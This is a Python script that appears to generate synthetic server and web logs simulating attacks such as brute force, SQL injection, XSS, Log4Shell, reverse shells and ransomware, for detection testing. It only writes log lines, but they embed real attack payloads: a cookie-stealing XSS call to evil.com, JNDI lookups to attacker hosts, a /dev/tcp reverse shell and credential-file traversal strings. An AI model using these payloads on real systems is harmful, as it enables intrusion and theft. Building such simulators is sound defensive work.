import random
import time
import os
from datetime import datetime
from threat_intel import ThreatIntel


def random_ip():
    """random malicious ip from threat intelligence feeds"""
    return ThreatIntel.random_ip()


def ts():
    """current time in linux log format: Dec 15 14:23:01"""
    return datetime.now().strftime("%b %d %H:%M:%S")


def write(filepath, line):
    """writes a line to file and prints it to terminal"""
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    with open(filepath, "a") as f:
        f.write(line + "\n")
    print(line)


def ssh_brute_force():
    """
    ssh brute force (password guessing with realistic burst pattern)
    real attacks come in bursts from one ip with increasing frequency,
    not as a uniform stream. this function simulates one full burst episode.
    """
    users = ["root", "admin", "ubuntu", "user", "test", "pi"]
    ip    = random_ip()   # one attacker ip for the whole burst
    port  = random.choice([22, 2222])
    host  = "ubuntu-server"

    # burst size: 20 to 50 attempts from same ip
    burst_size = random.randint(20, 50)

    # starting interval between attempts (slow at first, then faster)
    base_delay = random.uniform(0.3, 0.8)

    for i in range(burst_size):
        pid  = random.randint(10000, 99999)
        user = random.choice(users)

        # last attempt in burst: small chance of success
        if i == burst_size - 1 and random.random() < 0.05:
            line = (f"{ts()} {host} sshd[{pid}]: "
                    f"Accepted password for {user} from {ip} port {port} ssh2")
        elif random.random() < 0.7:
            line = (f"{ts()} {host} sshd[{pid}]: "
                    f"Failed password for invalid user {user} from {ip} port {port} ssh2")
        else:
            line = (f"{ts()} {host} sshd[{pid}]: "
                    f"Connection closed by invalid user {user} {ip} port {port} [preauth]")

        write("logs/system/auth.log", line)

        # attacks accelerate over time: delay shrinks with each attempt
        # simulates attacker ramping up speed as no block is detected
        delay = max(0.05, base_delay * (0.92 ** i))
        time.sleep(delay)

    # brief silence after burst before next one
    silence = random.uniform(2.0, 8.0)
    time.sleep(silence)

def port_scan():
    """
    port scan (scanning ports like nmap with burst pattern)
    real port scans hit many ports rapidly from one ip,
    then stop — not one port per interval
    """
    ip   = random_ip()   # one scanner ip for the whole sweep
    host = "ubuntu-server"
    pid  = random.randint(1000, 9999)

    # scan burst: 10 to 30 ports in rapid succession
    burst_size = random.randint(10, 30)

    # pick random ports to scan (no repeats)
    ports = random.sample(range(1, 65535), burst_size)

    for port in ports:
        variants = [
            f"{ts()} {host} kernel: [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP DPT={port}",
            f"{ts()} {host} sshd[{pid}]: refused connect from {ip}",
            f"{ts()} {host} kernel: TCP: request_sock_TCP: Possible SYN flooding on port {port}. Sending cookies.",
        ]
        write("logs/system/syslog", random.choice(variants))

        # port scans are fast: 0.05 to 0.2 seconds between ports
        time.sleep(random.uniform(0.05, 0.2))

    # silence after scan
    silence = random.uniform(3.0, 10.0)
    time.sleep(silence)

def sql_injection():
    """sql injection (attempts via url)"""
    ip       = random_ip()
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users;--",
        "' AND 1=1--",
        "admin'--",
        "1' ORDER BY 3--",
    ]
    endpoints = ["/api/users", "/login", "/search", "/products", "/admin"]
    payload   = random.choice(payloads)
    endpoint  = random.choice(endpoints)
    status    = random.choice([400, 403, 500])
    size      = random.randint(100, 800)

    line = (f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"GET {endpoint}?id={payload} HTTP/1.1" {status} {size}')
    write("logs/nginx/access.log", line)


def ddos():
    """ddos (single flood request from one ip, burst handled by loop)"""
    ip   = random_ip()
    size = random.randint(50, 200)

    line = (f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"GET / HTTP/1.1" 429 {size}')
    write("logs/nginx/access.log", line)


def syn_flood():
    """syn flood (kernel-level attack)"""
    ip   = random_ip()
    port = random.choice([80, 443, 22, 8080])

    variants = [
        f"{ts()} ubuntu-server kernel: TCP: Possible SYN flooding on port {port}. Sending cookies. Check SNMP counters.",
        f"{ts()} ubuntu-server kernel: [UFW BLOCK] IN=eth0 SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={random.randint(1024,65535)} DPT={port} SYN",
        f"{ts()} ubuntu-server kernel: nf_conntrack: table full, dropping packet",
    ]
    write("logs/system/kern.log", random.choice(variants))


def directory_traversal():
    """directory traversal (attempts to escape the folder)"""
    ip       = random_ip()
    payloads = [
        "/../../../etc/passwd",
        "/../../etc/shadow",
        "/../../../etc/hosts",
        "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/../../../proc/self/environ",
    ]
    payload = random.choice(payloads)
    status  = random.choice([400, 403, 404])
    size    = random.randint(100, 500)

    line = (f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"GET {payload} HTTP/1.1" {status} {size}')
    write("logs/nginx/access.log", line)


def privilege_escalation():
    """privilege escalation (attempts to get root access)"""
    users = ["www-data", "nobody", "daemon", "mysql", "postgres"]
    user  = random.choice(users)
    pid   = random.randint(1000, 9999)
    host  = "ubuntu-server"

    variants = [
        f"{ts()} {host} sudo[{pid}]: {user} : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/bin/bash",
        f"{ts()} {host} sudo[{pid}]: pam_unix(sudo:auth): authentication failure; logname={user} uid=33",
        f"{ts()} {host} su[{pid}]: FAILED su for root by {user}",
        f"{ts()} {host} sudo[{pid}]: {user} : 3 incorrect password attempts ; TTY=pts/1 ; USER=root ; COMMAND=/bin/sh",
    ]
    write("logs/system/auth.log", random.choice(variants))


def xss():
    """xss cross-site scripting attempts via url"""
    ip       = random_ip()
    payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        "'><script>fetch('http://evil.com?c='+document.cookie)</script>",
    ]
    endpoints = ["/search", "/comment", "/profile", "/feedback", "/login"]
    payload   = random.choice(payloads)
    endpoint  = random.choice(endpoints)
    status    = random.choice([200, 400, 403])
    size      = random.randint(100, 800)

    line = (f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"GET {endpoint}?q={payload} HTTP/1.1" {status} {size}')
    write("logs/nginx/access.log", line)


def log4shell():
    """log4shell cve-2021-44228 exploit attempt"""
    ip       = random_ip()
    payloads = [
        "${jndi:ldap://evil.com/exploit}",
        "${jndi:rmi://attacker.com/payload}",
        "${${lower:j}ndi:${lower:l}dap://evil.com/a}",
        "${jndi:dns://attacker.com/test}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/}",
    ]
    headers  = ["User-Agent", "X-Forwarded-For", "X-Api-Version"]
    payload  = random.choice(payloads)
    header   = random.choice(headers)
    status   = random.choice([200, 400, 500])
    size     = random.randint(100, 500)

    line = (f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"GET /api/v1/test HTTP/1.1" {status} {size} "{header}: {payload}"')
    write("logs/nginx/access.log", line)


def reverse_shell():
    """reverse shell attempt via command injection"""
    ip   = random_ip()
    pid  = random.randint(10000, 99999)
    host = "ubuntu-server"
    port = random.choice([4444, 1337, 9001, 8888])

    variants = [
        f"{ts()} {host} sshd[{pid}]: error: kex_exchange_identification: Connection closed by remote host {ip}",
        f"{ts()} {host} sudo[{pid}]: {random.choice(['www-data','daemon'])} : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        f"{ts()} {host} kernel: [UFW BLOCK] IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP DPT={port} SYN",
        f"{ts()} {host} sshd[{pid}]: Did not receive identification string from {ip} port {port}",
    ]
    write("logs/system/auth.log", random.choice(variants))


def credential_stuffing():
    """credential stuffing automated login attempts with leaked passwords"""
    ip   = random_ip()
    size = random.randint(100, 400)

    users  = ["john.doe", "jane.smith", "user123", "admin2024",
              "test.user", "support", "info", "contact"]
    user   = random.choice(users)
    status = random.choice([401, 403, 200])

    line = (f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"POST /login?username={user} HTTP/1.1" {status} {size}')
    write("logs/nginx/access.log", line)


def dns_amplification():
    """dns amplification using dns to flood a target"""
    ip   = random_ip()
    host = "ubuntu-server"
    pid  = random.randint(1000, 9999)

    variants = [
        f"{ts()} {host} named[{pid}]: client {ip}#53: query (cache) './IN/ANY' denied",
        f"{ts()} {host} named[{pid}]: DNS format error from {ip} resolving ANY/IN",
        f"{ts()} {host} kernel: [UFW BLOCK] IN=eth0 SRC={ip} DST=192.168.1.1 PROTO=UDP DPT=53",
        f"{ts()} {host} named[{pid}]: too many queries from {ip}, dropping",
    ]
    write("logs/system/syslog", random.choice(variants))


def arp_spoofing():
    """arp spoofing mac address poisoning attack"""
    host = "ubuntu-server"
    pid  = random.randint(1000, 9999)
    ip   = f"192.168.1.{random.randint(1, 254)}"
    mac1 = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
    mac2 = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])

    variants = [
        f"{ts()} {host} kernel: neighbour: arp_cache: neighbor {ip} is STALE",
        f"{ts()} {host} kernel: arp: {ip} moved from {mac1} to {mac2} on eth0",
        f"{ts()} {host} kernel: [UFW BLOCK] IN=eth0 ARP SRC={ip} MAC={mac1}",
        f"{ts()} {host} arpwatch[{pid}]: changed ethernet address {ip} {mac1} --> {mac2}",
    ]
    write("logs/system/kern.log", random.choice(variants))


def ransomware_activity():
    """ransomware file activity simulation"""
    host = "ubuntu-server"
    pid  = random.randint(1000, 9999)
    dirs = ["/var/www", "/home/ubuntu", "/etc", "/opt/app", "/data"]
    exts = [".encrypted", ".locked", ".crypto", ".ransom", ".pay2decrypt"]
    d    = random.choice(dirs)
    ext  = random.choice(exts)
    name = f"file_{random.randint(1000,9999)}{ext}"

    variants = [
        f"{ts()} {host} kernel: audit: type=SYSCALL arch=x86_64 syscall=rename pid={pid} comm=python3",
        f"{ts()} {host} syslog[{pid}]: file renamed: {d}/{name}",
        f"{ts()} {host} kernel: audit: too many files renamed in {d} by pid={pid}",
        f"{ts()} {host} cron[{pid}]: (root) CMD (find {d} -type f -exec mv {{}} {{}}{ext} \\;)",
    ]
    write("logs/system/syslog", random.choice(variants))


def lateral_movement():
    """lateral movement attacker hopping between internal hosts"""
    host = "ubuntu-server"
    pid  = random.randint(10000, 99999)
    src  = f"192.168.1.{random.randint(10, 50)}"
    dst  = f"192.168.1.{random.randint(51, 200)}"
    user = random.choice(["root", "ubuntu", "deploy", "admin"])
    port = random.choice([22, 2222])

    variants = [
        f"{ts()} {host} sshd[{pid}]: Accepted password for {user} from {src} port {port} ssh2",
        f"{ts()} {host} sshd[{pid}]: Failed password for {user} from {src} port {port} ssh2",
        f"{ts()} {host} sudo[{pid}]: {user} : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh {dst}",
        f"{ts()} {host} sshd[{pid}]: Accepted publickey for {user} from {src} port {port} ssh2: RSA",
    ]
    write("logs/system/auth.log", random.choice(variants))


def kill_chain():
    """kill chain realistic attack sequence from one ip (mitre att&ck)"""
    attacker_ip = random_ip()
    host = "ubuntu-server"

    print(f"\n  [kill chain started] attacker: {attacker_ip}\n")

    # stage 1 reconnaissance: port scan
    print("  [stage 1] reconnaissance port scan")
    for _ in range(random.randint(5, 10)):
        port = random.randint(1, 65535)
        pid  = random.randint(1000, 9999)
        variants = [
            f"{ts()} {host} kernel: [UFW BLOCK] IN=eth0 OUT= SRC={attacker_ip} DST=192.168.1.1 PROTO=TCP DPT={port}",
            f"{ts()} {host} sshd[{pid}]: refused connect from {attacker_ip}",
        ]
        write("logs/system/syslog", random.choice(variants))
        time.sleep(0.2)

    time.sleep(2)

    # stage 2 initial access: ssh brute force
    print("  [stage 2] initial access ssh brute force")
    users = ["root", "admin", "ubuntu"]
    for _ in range(random.randint(10, 20)):
        user = random.choice(users)
        pid  = random.randint(10000, 99999)
        line = (f"{ts()} {host} sshd[{pid}]: "
                f"Failed password for invalid user {user} from {attacker_ip} port 22 ssh2")
        write("logs/system/auth.log", line)
        time.sleep(0.3)

    time.sleep(2)

    # stage 3 initial access: successful login
    print("  [stage 3] initial access successful login")
    pid  = random.randint(10000, 99999)
    user = random.choice(users)
    line = (f"{ts()} {host} sshd[{pid}]: "
            f"Accepted password for {user} from {attacker_ip} port 22 ssh2")
    write("logs/system/auth.log", line)

    time.sleep(1)

    # stage 4 privilege escalation
    print("  [stage 4] privilege escalation")
    pid = random.randint(1000, 9999)
    for v in [
        f"{ts()} {host} sudo[{pid}]: {user} : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/bin/bash",
        f"{ts()} {host} sudo[{pid}]: {user} : 3 incorrect password attempts ; TTY=pts/1 ; USER=root ; COMMAND=/bin/sh",
        f"{ts()} {host} su[{pid}]: FAILED su for root by {user}",
    ]:
        write("logs/system/auth.log", v)
        time.sleep(0.3)

    time.sleep(2)

    # stage 5 discovery: web app attack
    print("  [stage 5] discovery web application attack")
    for payload in ["/../../../etc/passwd", "/../../etc/shadow", "/../../../etc/hosts"]:
        status = random.choice([400, 403, 404])
        size   = random.randint(100, 500)
        line = (f'{attacker_ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
                f'"GET {payload} HTTP/1.1" {status} {size}')
        write("logs/nginx/access.log", line)
        time.sleep(0.3)

    time.sleep(2)

    # stage 6 lateral movement
    print("  [stage 6] lateral movement")
    for target in [f"192.168.1.{random.randint(10,50)}", f"192.168.1.{random.randint(51,100)}"]:
        pid  = random.randint(10000, 99999)
        line = (f"{ts()} {host} sudo[{pid}]: {user} : TTY=pts/0 ; "
                f"PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh {target}")
        write("logs/system/auth.log", line)
        time.sleep(0.5)

    time.sleep(2)

    # stage 7 impact: ransomware
    print("  [stage 7] impact ransomware activity")
    pid = random.randint(1000, 9999)
    for d in ["/var/www", "/home/ubuntu", "/data"]:
        ext  = random.choice([".encrypted", ".locked", ".ransom"])
        name = f"file_{random.randint(1000,9999)}{ext}"
        write("logs/system/syslog", f"{ts()} {host} syslog[{pid}]: file renamed: {d}/{name}")
        time.sleep(0.3)

    print(f"\n  [kill chain completed] attacker: {attacker_ip}\n")


def normal_traffic():
    """normal web traffic (legitimate users)"""
    ip   = random_ip()
    size = random.randint(200, 5000)
    pages = [
        "/", "/index.html", "/about", "/contact",
        "/products", "/blog", "/api/health", "/favicon.ico",
        "/static/main.css", "/static/app.js",
    ]
    status = random.choice([200, 200, 200, 200, 301, 304])
    page   = random.choice(pages)
    method = random.choice(["GET", "GET", "GET", "POST"])

    line = (f'{ip} - - [{datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"{method} {page} HTTP/1.1" {status} {size}')
    write("logs/nginx/access.log", line)


def normal_ssh():
    """normal ssh logins (legitimate users)"""
    users = ["deploy", "admin", "ubuntu"]
    user  = random.choice(users)
    ip    = f"192.168.1.{random.randint(1, 50)}"
    pid   = random.randint(10000, 99999)
    host  = "ubuntu-server"

    variants = [
        f"{ts()} {host} sshd[{pid}]: Accepted publickey for {user} from {ip} port 22 ssh2",
        f"{ts()} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user {user}",
        f"{ts()} {host} sshd[{pid}]: pam_unix(sshd:session): session closed for user {user}",
    ]
    write("logs/system/auth.log", random.choice(variants))


def normal_system():
    """normal system events (cron, services, kernel)"""
    host = "ubuntu-server"
    pid  = random.randint(1000, 9999)

    variants = [
        f"{ts()} {host} CRON[{pid}]: (root) CMD (test -e /run/systemd/system)",
        f"{ts()} {host} systemd[1]: Started Session {random.randint(1,999)} of user ubuntu.",
        f"{ts()} {host} kernel: eth0: renamed from veth{random.randint(1000,9999)}",
        f"{ts()} {host} sshd[{pid}]: Server listening on 0.0.0.0 port 22.",
        f"{ts()} {host} CRON[{pid}]: (root) CMD (find /var/log -name '*.log' -mtime +30 -delete)",
        f"{ts()} {host} systemd[1]: NetworkManager.service: Succeeded.",
        f"{ts()} {host} kernel: usb 1-1: new high-speed USB device number {random.randint(1,9)}",
    ]
    write("logs/system/syslog", random.choice(variants))


ATTACKS = {
    "1":  ("ssh brute force",            ssh_brute_force),
    "2":  ("port scan",                  port_scan),
    "3":  ("sql injection",              sql_injection),
    "4":  ("ddos / http flood",          ddos),
    "5":  ("syn flood",                  syn_flood),
    "6":  ("directory traversal",        directory_traversal),
    "7":  ("privilege escalation",       privilege_escalation),
    "8":  ("xss",                        xss),
    "9":  ("log4shell",                  log4shell),
    "10": ("reverse shell",              reverse_shell),
    "11": ("credential stuffing",        credential_stuffing),
    "12": ("dns amplification",          dns_amplification),
    "13": ("arp spoofing",               arp_spoofing),
    "14": ("ransomware activity",        ransomware_activity),
    "15": ("lateral movement",           lateral_movement),
    "16": ("kill chain (full sequence)", kill_chain),
    "17": ("all attacks mixed",          None),
    "18": ("mixed with normal",          None),
    "19": ("normal traffic only",        None),
}

ENV_ATTACKS = {
    "ssh_brute":            "1",
    "port_scan":            "2",
    "sql_injection":        "3",
    "ddos":                 "4",
    "syn_flood":            "5",
    "directory_traversal":  "6",
    "privilege_escalation": "7",
    "xss":                  "8",
    "log4shell":            "9",
    "reverse_shell":        "10",
    "credential_stuffing":  "11",
    "dns_amplification":    "12",
    "arp_spoofing":         "13",
    "ransomware":           "14",
    "lateral_movement":     "15",
    "kill_chain":           "16",
    "all":                  "17",
    "mixed":                "18",
    "normal_only":          "19",
}


def menu():
    """shows menu and returns user choice"""
    print("\n" + "="*52)
    print("  security log generator")
    print("="*52)
    for key, (name, _) in ATTACKS.items():
        print(f"  {key:>2}.  {name}")
    print("="*52)

    choice = input("  choose attack (1-19): ").strip()
    if choice not in ATTACKS:
        print("  unknown choice, try again")
        return menu()
    return choice


def _loop(fn, interval, mode):
    """main generation loop  runs until ctrl+c"""

    attack_fns = [
        ssh_brute_force, port_scan, sql_injection,
        ddos, syn_flood, directory_traversal, privilege_escalation,
        xss, log4shell, reverse_shell, credential_stuffing,
        dns_amplification, arp_spoofing, ransomware_activity, lateral_movement
    ]

    normal_fns = [normal_traffic, normal_ssh, normal_system]

    try:
        while True:
            if fn is None and mode == "19":
                random.choice(normal_fns)()

            elif fn is None and mode == "18":
                if random.random() < 0.80:
                    random.choice(normal_fns)()
                else:
                    random.choice(attack_fns)()

            elif fn is None:
                random.choice(attack_fns)()

            elif fn == kill_chain:
                kill_chain()
                print("  waiting 30s before next kill chain...\n")
                time.sleep(30)

            else:
                fn()

            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n\n  stopped. logs saved to ./logs/")

def run_interactive():
    """interactive mode shows menu, asks for interval"""
    choice = menu()

    interval = input("  interval between lines (sec, e.g. 0.5): ").strip()
    try:
        interval = float(interval)
    except:
        interval = 0.5

    name, fn = ATTACKS[choice]

    print(f"\n  attack:    {name}")
    print(f"  interval:  {interval} sec")
    print(f"  logs:      ./logs/")
    print(f"  stop:      ctrl+c\n")

    _loop(fn, interval, choice)   # pass choice as mode


def run_env():
    """docker mode reads ATTACK and INTERVAL from environment"""
    attack   = os.environ.get("ATTACK", "all").strip()
    interval = os.environ.get("INTERVAL", "0.5").strip()

    key = ENV_ATTACKS.get(attack)
    if key is None:
        print(f"  [warn] unknown attack '{attack}', falling back to 'all'")
        key = "17"

    try:
        interval = float(interval)
    except:
        interval = 0.5

    name, fn = ATTACKS[key]

    print(f"  mode:      docker / env")
    print(f"  attack:    {name}")
    print(f"  interval:  {interval} sec")
    print(f"  logs:      ./logs/")
    print(f"  stop:      ctrl+c\n")

    _loop(fn, interval, key)   # pass key as mode


if __name__ == "__main__":
    print("\n  loading threat intelligence feeds...")
    ThreatIntel.load()
    print(f"  malicious ip pool: {ThreatIntel.count()} ips\n")

    if os.environ.get("ATTACK"):
        run_env()
    else:
        run_interactive()